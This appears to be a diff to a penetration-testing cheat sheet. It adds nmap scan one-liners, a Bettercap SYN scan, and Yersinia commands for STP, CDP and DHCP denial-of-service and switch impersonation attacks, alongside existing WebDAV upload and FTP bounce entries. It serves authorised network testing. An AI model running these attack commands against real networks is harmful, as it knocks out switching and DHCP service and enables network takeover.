@@ -37,6 +37,16 @@ nmap -p- -sU -oN all_udp_ports.txt target-ip # Scan all udp ports
 ls -lh /usr/share/nmap/scripts/ # List all nse scripts
 nmap --proxies socks4://proxy-ip:1080 target-ip # Nmap through socks4 proxy
 nmap -P0 -n -b username:password@target-ip target2-ip --proxies socks4://proxy-ip:1080 -vvvv # Ftp bounce scan
+nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> # Nmap fast scan for the most 1000tcp ports used
+nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> # Nmap fast scan for all the ports
+nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP> # # Nmap fast scan for all the ports slower to avoid failures due to -T4
+nmap -sU -sV --version-intensity 0 -n -F -T4 <IP> # # Nmap fast check if any of the 100 most common UDP services is running
+nmap -sU -sV -sC -n -F -T4 <IP> # # Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
+
+# =========
+# Bettercap
+# =========
+syn.scan 192.168.1.0/24 1 10000 # Ports 1-10000
 
 # ========
 # Gobuster
@@ -59,10 +69,30 @@ ffuf -w /path/to/wordlist -u https://target/FUZZ # Brute force web directories
 # =======
 davtest -url http://target-ip/ -sendbd auto # Tries to upload (executable) files to webdav
 
-
-
-
-
+# ========
+# Yersinia
+# ========
+apt-get install yersinia #Installation
+sudo apt install kali-linux-large # Another way to install it in Kali
+yersinia -I # Interactive mode
+yersinia -G # For graphic mode
+# STP BPDU DoS
+yersinia stp -attack 2
+yersinia stp -attack 3
+# STP TCP Attack
+yersinia stp -attack 1 # Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
+yersinia stp -attack 0 # Will send 1 CONF packet, nothing else will happen
+# STP Root Attack
+yersinia stp -attack 4 # Behaves like the root switch
+yersinia stp -attack 5 # This will make the device behaves as a switch but will not be root
+# Inducing CDP Table Flooding
+sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
+# CDP Impersonation Attack
+sudo yersinia cdp -attack 2 # Simulate a new CISCO device
+sudo yersinia cdp -attack 0 # Send a CDP packet
+# DHCP DoS (RELEASE Packets)
+yersinia dhcp -attack 1
+yersinia dhcp -attack 3 #More parameters are needed
 
 
 
